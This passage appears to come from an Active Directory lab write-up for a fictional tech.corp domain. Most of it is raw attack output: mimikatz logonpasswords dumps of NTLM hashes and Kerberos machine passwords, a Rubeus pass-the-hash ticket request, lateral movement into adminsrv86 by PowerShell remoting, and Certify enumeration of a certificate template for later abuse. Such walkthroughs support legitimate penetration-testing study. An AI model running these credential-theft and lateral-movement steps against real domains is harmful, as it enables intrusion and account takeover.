        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : techsrv30$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 75a667d1b05db757150410f320e0ff55
         * SHA1     : a43906378e16c8529493ca8856e15373980605a8
         * DPAPI    : a43906378e16c8529493ca8856e15373
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : TECH.CORP
         * Password : c9 34 92 3f 54 dc dd 7e 15 59 ae d1 d9 43 95 3c 07 7f 3a b0 47 c6 45 ac 07 49 72 d7 0c 1f f6 1d 64 57 49 3a 42 87 e4 8f e7 2a ff 95 66 cd a4 b6 a3 ef 1c f9 9c 2b 7b 3f 45 07 7c d0 0e c1 4f 22 e0 99 43 4d 35 12 06 e0 8f 54 1f 36 2d 22 a5 47 ed 0c bc 23 15 66 bc 61 93 e5 a4 bc 36 0c 3d ed cf 32 c8 78 c7 54 29 e1 9d f5 90 37 81 9f 44 3c c4 7e 23 f4 4a 69 54 60 ec 4b ae 61 a7 dd 4f 13 9f 03 39 71 47 67 1e ed 49 e0 9a ba 21 e4 c3 94 fe 35 ee b2 e6 e9 9c cc a2 6e 50 37 93 7f 68 db 79 09 84 b4 ac 6d 02 91 0a 84 47 4c d5 b5 61 f6 51 8c fc 77 51 9d c4 86 b3 4c 01 03 32 30 59 6d 2b a8 7d a8 3b 15 d2 b2 1d d5 fb 98 68 00 d9 99 23 51 1d 1c 6e c9 57 e0 9d 01 ba 36 96 af 7f c8 80 da 99 4e 29 5e 9f 70 fe 00 e5 0c 66 22 d8 10
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 64777 (00000000:0000fd09)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 0e422d5eddad1acbd0375fd77156b7d3
         * SHA1     : 504007fa88bc6eac7645eff6e88e50196608472b
         * DPAPI    : 504007fa88bc6eac7645eff6e88e5019
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : tech.corp
         * Password : qM@b&!?nU@3oY#/hV3M.=c$Srqj3^7;HP`WpS@p38"dMeeSP'a]5g Kof(kR4vy9 (!!GpC;@k"X, xriOE8-BF9ht[zi>R)FR&FiKG7_OPvZ#D:'/s%YFty
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 29663 (00000000:000073df)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 75a667d1b05db757150410f320e0ff55
         * SHA1     : a43906378e16c8529493ca8856e15373980605a8
         * DPAPI    : a43906378e16c8529493ca8856e15373
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : tech.corp
         * Password : c9 34 92 3f 54 dc dd 7e 15 59 ae d1 d9 43 95 3c 07 7f 3a b0 47 c6 45 ac 07 49 72 d7 0c 1f f6 1d 64 57 49 3a 42 87 e4 8f e7 2a ff 95 66 cd a4 b6 a3 ef 1c f9 9c 2b 7b 3f 45 07 7c d0 0e c1 4f 22 e0 99 43 4d 35 12 06 e0 8f 54 1f 36 2d 22 a5 47 ed 0c bc 23 15 66 bc 61 93 e5 a4 bc 36 0c 3d ed cf 32 c8 78 c7 54 29 e1 9d f5 90 37 81 9f 44 3c c4 7e 23 f4 4a 69 54 60 ec 4b ae 61 a7 dd 4f 13 9f 03 39 71 47 67 1e ed 49 e0 9a ba 21 e4 c3 94 fe 35 ee b2 e6 e9 9c cc a2 6e 50 37 93 7f 68 db 79 09 84 b4 ac 6d 02 91 0a 84 47 4c d5 b5 61 f6 51 8c fc 77 51 9d c4 86 b3 4c 01 03 32 30 59 6d 2b a8 7d a8 3b 15 d2 b2 1d d5 fb 98 68 00 d9 99 23 51 1d 1c 6e c9 57 e0 9d 01 ba 36 96 af 7f c8 80 da 99 4e 29 5e 9f 70 fe 00 e5 0c 66 22 d8 10
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 29629 (00000000:000073bd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 75a667d1b05db757150410f320e0ff55
         * SHA1     : a43906378e16c8529493ca8856e15373980605a8
         * DPAPI    : a43906378e16c8529493ca8856e15373
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : tech.corp
         * Password : c9 34 92 3f 54 dc dd 7e 15 59 ae d1 d9 43 95 3c 07 7f 3a b0 47 c6 45 ac 07 49 72 d7 0c 1f f6 1d 64 57 49 3a 42 87 e4 8f e7 2a ff 95 66 cd a4 b6 a3 ef 1c f9 9c 2b 7b 3f 45 07 7c d0 0e c1 4f 22 e0 99 43 4d 35 12 06 e0 8f 54 1f 36 2d 22 a5 47 ed 0c bc 23 15 66 bc 61 93 e5 a4 bc 36 0c 3d ed cf 32 c8 78 c7 54 29 e1 9d f5 90 37 81 9f 44 3c c4 7e 23 f4 4a 69 54 60 ec 4b ae 61 a7 dd 4f 13 9f 03 39 71 47 67 1e ed 49 e0 9a ba 21 e4 c3 94 fe 35 ee b2 e6 e9 9c cc a2 6e 50 37 93 7f 68 db 79 09 84 b4 ac 6d 02 91 0a 84 47 4c d5 b5 61 f6 51 8c fc 77 51 9d c4 86 b3 4c 01 03 32 30 59 6d 2b a8 7d a8 3b 15 d2 b2 1d d5 fb 98 68 00 d9 99 23 51 1d 1c 6e c9 57 e0 9d 01 ba 36 96 af 7f c8 80 da 99 4e 29 5e 9f 70 fe 00 e5 0c 66 22 d8 10
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 28398 (00000000:00006eee)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:15 AM
SID               :
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 75a667d1b05db757150410f320e0ff55
         * SHA1     : a43906378e16c8529493ca8856e15373980605a8
         * DPAPI    : a43906378e16c8529493ca8856e15373
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : techsrv30$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:15 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : TECH.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents>
```

{{< figure src="image 5.png" alt="image 5" >}}

```xml
PS C:\Users\studentuser\Desktop> Get-DomainGroupMember -Identity "srvusers" -Domain tech.corp

GroupDomain             : tech.corp
GroupName               : srvusers
GroupDistinguishedName  : CN=srvusers,CN=Users,DC=tech,DC=corp
MemberDomain            : tech.corp
MemberName              : TECHSRV30$
MemberDistinguishedName : CN=techsrv30,CN=Computers,DC=tech,DC=corp
MemberObjectClass       : computer
MemberSID               : S-1-5-21-1600556212-896947471-994435180-1104

PS C:\Users\studentuser\Desktop> Get-DomainComputer -Identity techsrv30 -Properties memberof -Domain tech.corp | Select-Object name, memberof

name memberof
---- --------
     CN=srvusers,CN=Users,DC=tech,DC=corp
     
PS C:\Users\studentuser\Desktop> Get-DomainGroup -Domain tech.corp | Where-Object { (Get-DomainGroupMember -Identity $_.samaccountname -Domain tech.corp).MemberName -contains 'techsrv30$' }
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
WARNING: [Get-DomainGroupMember] Error converting CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=tech,DC=corp

usncreated            : 16568
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : srvusers
whenchanged           : 12/9/2025 10:10:26 AM
objectsid             : S-1-5-21-1600556212-896947471-994435180-1111
objectclass           : {top, group}
cn                    : srvusers
usnchanged            : 37793
dscorepropagationdata : {9/3/2025 9:55:01 AM, 1/1/1601 12:00:00 AM}
name                  : srvusers
distinguishedname     : CN=srvusers,CN=Users,DC=tech,DC=corp
member                : CN=techsrv30,CN=Computers,DC=tech,DC=corp
whencreated           : 9/3/2025 9:54:24 AM
instancetype          : 4
objectguid            : 488ae915-98c6-4b39-a3ab-855532361298
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=tech,DC=corp
```

from the above output, we can see that `techsrv30$` is a member of `srvusers` and that srvusers has local adminstrator rights in `adminsrv86`. 

```xml
PS C:\Users\studentuser\Desktop> klist purge

Current LogonId is 0:0x3e7
        Deleting all tickets:
        Ticket(s) purged!
PS C:\Users\studentuser\Desktop> .\Rubeus.exe asktgt /user:TECHSRV30$ /rc4:75a667d1b05db757150410f320e0ff55 /domain:tech.corp /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 75a667d1b05db757150410f320e0ff55
[*] Building AS-REQ (w/ preauth) for: 'tech.corp\TECHSRV30$'
[*] Using domain controller: 172.16.4.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFbDCCBWigAwIBBaEDAgEWooIEiDCCBIRhggSAMIIEfKADAgEFoQsbCVRFQ0guQ09SUKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJdGVjaC5jb3Jwo4IERjCCBEKgAwIBEqEDAgEEooIENASCBDDmexnUMhNdsypW
      zujNxKzPhNQNLuyX5UdRW/1m9uuUigJNfjhr5ire2GGaMXhBSxqYOFTiHofQ0BHYSrN3lgDlFV6OfRTu
      dOM67sQEmJr2iciO3VzN7kF6kqH/yo1VdD2f0lF3HHVUZK7OpKb8ztUqSNCeGYEIcp+W876P93ScXyU8
      Y3Ixo3w3sh1C/Xgx/FFg0IN4f/5lvz1rxhB9I2edKBFuSUyQSJ7NFbiZjMCMlVC9qzIH98wei2nvQsEg
      /WYb9BechaE/TibMd1qu0p2QxuLrNBQRS7nSbXt5hSacaCndJgkv3guac41Cv/JuDkNcOWTi2zn9BtOC
      I0hCR1vC3sPl0jID3Xokofw2m9T0A9D9gOsQHGfwa5oSqtUzWSP5ZGqvS2PHMuwq2wF0ZwmWHiqzN7vi
      UCHb8fwDOU+tWeHGKLbPzwUsyUVr2C/nTolhp4nCCg1a8ZelqAkMvWo3s1sa7dDNKOY3wm7m0wKa38dq
      vqZaX3I/JNHkVe59bhtRcAy94Za086S3sLD238HwaNy5UI71dvp4rnw0fUTXaTrLtEQ0WsOcmwaiRbod
      BMBJXfNIpNKYtlD16Q0MOFBXqJaCH9/0hsrQPHKcMJZ3+CGP+A7AMm2QzKStK0awzxJw4IrbfUJYL0rl
      J0wDpqlTms2wsj8ih83pgIo5HvSjdwCdmwfpR4k4/OUHgpAUgc0VWWEfeeJxmTtJli8l78Ltj6mP33tR
      0pH0RNwqJY0F+6ixg1Mtskl8pUbb5Osmv5lR1B58gCR72m+P1KEaszi9ckU790epOOLGuANxWEiEa1ED
      T594Z/Dw6lbjN4LJqXY9mutgtmqEPk8Jj4Xv+rJqWibAYITvNk9KKTERTwUbGzCVQxNBY3YKc4kDOeLU
      AcyX9++Q6uuEiMt4O45WN5x5D87tVdMMNlCqfg1s/Ko+Zl+h2Up/P1vvg4iULF+UUhnB97nYAbBUIx2Y
      mBVSkcK/WzxSsrqea64V1uWvE/ptQ8XHbFQW2ygkHioTmGC4JLtTeWXOlXwiDdHLJSWUCpWHSm1jiZgG
      an6poSJjtjnNgxKTV91kFFb6G3gZuyndW8UbAHpTRT/X9S+321dgv5WF+vjoia1atXvFv3ULG0x5lb1N
      iJjdOYNbR4LEouexyymGzfBYoCieEhYWJL4Nc6a0kJUGgQYgHvof+t82oYEaCpEmb5bA2uRyLG2h9U6H
      FNUKXaVwwpUGkmqUuYGhQVsqXo9Js9lZ2BNg6wt2h7FLhmj8rWr/an1uKZIX2EHvvLKbBxeqhlW2t6nu
      tMnSSAdq7FdyOpabQe63IR6hSvTQj3SAaNyp+lwrXxr8TpgqHvUJSAd/mtEFRBrmJqx3YZJ8QadjTt5a
      DNTEFe8bj2dyXIjP/hECrz7FgyWkpQ4vgJ1+p1V1j4Fp2A3DOthKtEq7o4HPMIHMoAMCAQCigcQEgcF9
      gb4wgbuggbgwgbUwgbKgGzAZoAMCARehEgQQFFxSPFzNQEqBgRS3UJF4NqELGwlURUNILkNPUlCiFzAV
      oAMCAQGhDjAMGwpURUNIU1JWMzAkowcDBQBA4QAApREYDzIwMjUxMjA5MTAzNDA1WqYRGA8yMDI1MTIw
      OTIwMzQwNVqnERgPMjAyNTEyMTYxMDM0MDVaqAsbCVRFQ0guQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRn
      dBsJdGVjaC5jb3Jw
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/tech.corp
  ServiceRealm             :  TECH.CORP
  UserName                 :  TECHSRV30$ (NT_PRINCIPAL)
  UserRealm                :  TECH.CORP
  StartTime                :  12/9/2025 10:34:05 AM
  EndTime                  :  12/9/2025 8:34:05 PM
  RenewTill                :  12/16/2025 10:34:05 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  FFxSPFzNQEqBgRS3UJF4Ng==
  ASREP (key)              :  75A667D1B05DB757150410F320E0FF55

PS C:\Users\studentuser\Desktop> klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: TECHSRV30$ @ TECH.CORP
        Server: krbtgt/tech.corp @ TECH.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 12/9/2025 10:34:05 (local)
        End Time:   12/9/2025 20:34:05 (local)
        Renew Time: 12/16/2025 10:34:05 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\Users\studentuser\Desktop> ls \\adminsrv86.tech.corp\C$

    Directory: \\adminsrv86.tech.corp\C$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/8/2025   4:31 PM                inetpub
d-----          9/3/2025   8:11 AM                Packages
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---          8/8/2025   4:55 PM                Program Files
d-----          8/8/2025   4:55 PM                Program Files (x86)
d-----          8/8/2025   5:02 PM                Temp
d-r---          9/3/2025  10:37 AM                Users
d-r---          9/3/2025   8:09 AM                Windows
d-----         12/9/2025   7:53 AM                WindowsAzure

PS C:\Users\studentuser\Desktop> Enter-PSSession -ComputerName adminsrv86.tech.corp
[adminsrv86.tech.corp]: PS C:\Users\TECHSRV30$\Documents> whoami
tech\techsrv30$
[adminsrv86.tech.corp]: PS C:\Users\TECHSRV30$\Documents>

```

Attack Chain

{{< figure src="39e88dda-d831-410b-9a64-413c2529f28d.png" alt="39e88dda-d831-410b-9a64-413c2529f28d" >}}

**BloodHound missed this** because the relationship between computer accounts and local admin groups isn't always perfectly captured, especially when it's through group membership rather than direct ACLs.

{{< figure src="image 6.png" alt="image 6" >}}

### Tech-DC

```xml
[adminsrv86.tech.corp]: PS C:\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | Out-File creds.txt
[adminsrv86.tech.corp]: PS C:\Temp> cat .\creds.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 635596 (00000000:0009b2cc)
Session           : Service from 0
User Name         : causer
Domain            : TECH
Logon Server      : tech-dc
Logon Time        : 12/9/2025 6:37:23 AM
SID               : S-1-5-21-1600556212-896947471-994435180-1109
        msv :
         [00000003] Primary
         * Username : causer
         * Domain   : TECH
         * NTLM     : 99864b36ef401ee5f15d64e3d4fcd071
         * SHA1     : 62b37112c50931cc51a48d9df3afdd064edb4a76
         * DPAPI    : 8176ca005f8b0334c19a44b5d1d8700e
        tspkg :
        wdigest :
         * Username : causer
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : causer
         * Domain   : TECH.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 66664 (00000000:00010468)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:57 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : 1d73113263bcb967ffa7a68fe7cbe120
         * SHA1     : ab79441ed57c318903b036546f90f4b436856d8e
         * DPAPI    : ab79441ed57c318903b036546f90f4b4
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : tech.corp
         * Password : TF(SZ<4=Xs/v#fQKFc/EgZD4q84VzEoV0C7Aggm(!2F:4rQao6^V>YjpuoJ?t\-d83(Dl2u%LFjOr"UM5HIG(1lHZQZD,[.lFeT1ZDe50'nzz/KEX_DDymI^
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : adminsrv86$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:56 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : cfdbca3d9e0bdc854239c7d5358bd894
         * SHA1     : 8e14f18c0c3ba18a70eadae44b5b1a52d9e112d6
         * DPAPI    : 8e14f18c0c3ba18a70eadae44b5b1a52
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : TECH.CORP
         * Password : 5b da d3 4f 42 59 34 7c 19 f4 54 35 ad 03 54 2a 49 c5 27 9b 1d e6 57 d2 36 a5 92 40 90 fe d2 60 51 55 d0 59 ad 4d a5 ba 30 84 0a 30 20 1d c6 d7 a6 1c a0 38 5d 53 e2 80 53 2f 9e 67 c4 0b 74 fc 71 3e 4e 97 b6 8a da 1a 76 26 28 c7 8a 99 d6 b5 07 4c 86 da 91 2c e3 1f ae 06 22 9d 67 3d a7 45 6e 60 ed 9f 35 74 69 05 5a a9 15 5a 3a 39 ae 86 60 a2 6d f7 d7 2f ae a5 4d b0 ac 00 da 81 67 e6 20 c7 16 d6 18 86 40 83 dd 3a a5 37 d1 b3 5b 30 f8 6b f9 32 fc 40 15 61 f0 eb 8c cc b8 f4 8d 97 0c 69 5f a3 e7 7f 40 55 bf 1b a3 53 2b 6f 58 7b e2 48 c2 7d 74 3b 73 ff c1 3f 6b 31 69 47 b4 cb df ba f1 fa 1e 48 5f 70 bf 9f b0 6d 77 42 44 32 53 97 41 53 4d 04 b2 81 95 41 85 89 cf 59 cb b4 91 68 b3 dd b3 af d5 c7 8b ae a3 17 36 73 2d af
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30180 (00000000:000075e4)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:56 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : cfdbca3d9e0bdc854239c7d5358bd894
         * SHA1     : 8e14f18c0c3ba18a70eadae44b5b1a52d9e112d6
         * DPAPI    : 8e14f18c0c3ba18a70eadae44b5b1a52
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : tech.corp
         * Password : 5b da d3 4f 42 59 34 7c 19 f4 54 35 ad 03 54 2a 49 c5 27 9b 1d e6 57 d2 36 a5 92 40 90 fe d2 60 51 55 d0 59 ad 4d a5 ba 30 84 0a 30 20 1d c6 d7 a6 1c a0 38 5d 53 e2 80 53 2f 9e 67 c4 0b 74 fc 71 3e 4e 97 b6 8a da 1a 76 26 28 c7 8a 99 d6 b5 07 4c 86 da 91 2c e3 1f ae 06 22 9d 67 3d a7 45 6e 60 ed 9f 35 74 69 05 5a a9 15 5a 3a 39 ae 86 60 a2 6d f7 d7 2f ae a5 4d b0 ac 00 da 81 67 e6 20 c7 16 d6 18 86 40 83 dd 3a a5 37 d1 b3 5b 30 f8 6b f9 32 fc 40 15 61 f0 eb 8c cc b8 f4 8d 97 0c 69 5f a3 e7 7f 40 55 bf 1b a3 53 2b 6f 58 7b e2 48 c2 7d 74 3b 73 ff c1 3f 6b 31 69 47 b4 cb df ba f1 fa 1e 48 5f 70 bf 9f b0 6d 77 42 44 32 53 97 41 53 4d 04 b2 81 95 41 85 89 cf 59 cb b4 91 68 b3 dd b3 af d5 c7 8b ae a3 17 36 73 2d af
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30146 (00000000:000075c2)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:56 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : cfdbca3d9e0bdc854239c7d5358bd894
         * SHA1     : 8e14f18c0c3ba18a70eadae44b5b1a52d9e112d6
         * DPAPI    : 8e14f18c0c3ba18a70eadae44b5b1a52
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : tech.corp
         * Password : 5b da d3 4f 42 59 34 7c 19 f4 54 35 ad 03 54 2a 49 c5 27 9b 1d e6 57 d2 36 a5 92 40 90 fe d2 60 51 55 d0 59 ad 4d a5 ba 30 84 0a 30 20 1d c6 d7 a6 1c a0 38 5d 53 e2 80 53 2f 9e 67 c4 0b 74 fc 71 3e 4e 97 b6 8a da 1a 76 26 28 c7 8a 99 d6 b5 07 4c 86 da 91 2c e3 1f ae 06 22 9d 67 3d a7 45 6e 60 ed 9f 35 74 69 05 5a a9 15 5a 3a 39 ae 86 60 a2 6d f7 d7 2f ae a5 4d b0 ac 00 da 81 67 e6 20 c7 16 d6 18 86 40 83 dd 3a a5 37 d1 b3 5b 30 f8 6b f9 32 fc 40 15 61 f0 eb 8c cc b8 f4 8d 97 0c 69 5f a3 e7 7f 40 55 bf 1b a3 53 2b 6f 58 7b e2 48 c2 7d 74 3b 73 ff c1 3f 6b 31 69 47 b4 cb df ba f1 fa 1e 48 5f 70 bf 9f b0 6d 77 42 44 32 53 97 41 53 4d 04 b2 81 95 41 85 89 cf 59 cb b4 91 68 b3 dd b3 af d5 c7 8b ae a3 17 36 73 2d af
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 66635 (00000000:0001044b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:57 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : cfdbca3d9e0bdc854239c7d5358bd894
         * SHA1     : 8e14f18c0c3ba18a70eadae44b5b1a52d9e112d6
         * DPAPI    : 8e14f18c0c3ba18a70eadae44b5b1a52
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : tech.corp
         * Password : 5b da d3 4f 42 59 34 7c 19 f4 54 35 ad 03 54 2a 49 c5 27 9b 1d e6 57 d2 36 a5 92 40 90 fe d2 60 51 55 d0 59 ad 4d a5 ba 30 84 0a 30 20 1d c6 d7 a6 1c a0 38 5d 53 e2 80 53 2f 9e 67 c4 0b 74 fc 71 3e 4e 97 b6 8a da 1a 76 26 28 c7 8a 99 d6 b5 07 4c 86 da 91 2c e3 1f ae 06 22 9d 67 3d a7 45 6e 60 ed 9f 35 74 69 05 5a a9 15 5a 3a 39 ae 86 60 a2 6d f7 d7 2f ae a5 4d b0 ac 00 da 81 67 e6 20 c7 16 d6 18 86 40 83 dd 3a a5 37 d1 b3 5b 30 f8 6b f9 32 fc 40 15 61 f0 eb 8c cc b8 f4 8d 97 0c 69 5f a3 e7 7f 40 55 bf 1b a3 53 2b 6f 58 7b e2 48 c2 7d 74 3b 73 ff c1 3f 6b 31 69 47 b4 cb df ba f1 fa 1e 48 5f 70 bf 9f b0 6d 77 42 44 32 53 97 41 53 4d 04 b2 81 95 41 85 89 cf 59 cb b4 91 68 b3 dd b3 af d5 c7 8b ae a3 17 36 73 2d af
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:57 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 28910 (00000000:000070ee)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:56 AM
SID               :
        msv :
         [00000003] Primary
         * Username : adminsrv86$
         * Domain   : TECH
         * NTLM     : cfdbca3d9e0bdc854239c7d5358bd894
         * SHA1     : 8e14f18c0c3ba18a70eadae44b5b1a52d9e112d6
         * DPAPI    : 8e14f18c0c3ba18a70eadae44b5b1a52
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : adminsrv86$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:56 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : adminsrv86$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : adminsrv86$
         * Domain   : TECH.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!
```

`User: causer
NTLM: 99864b36ef401ee5f15d64e3d4fcd071`

`Machine Account: ADMINSRV86$
NTLM: cfdbca3d9e0bdc854239c7d5358bd894`

Now, we are the `techsrv30$` user which is a machine account on the `adminsrv86` machine, now from the bloodhound graph we can see that `causer` who is another domain user in the same machine and it has rights to enroll in the FIDO templates.

We can verify this by using the following command, which we used earlier `.\Certify.exe find /ca:tech-dc.tech.corp\tech-tech-dc-CA`.

**`FIDO Template - Enrollment Rights:`**

```xml
    CA Name                               : tech-dc.tech.corp\tech-tech-dc-CA
    Template Name                         : FIDO
    Schema Version                        : 2
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECH\causer                   S-1-5-21-1600556212-896947471-994435180-1109
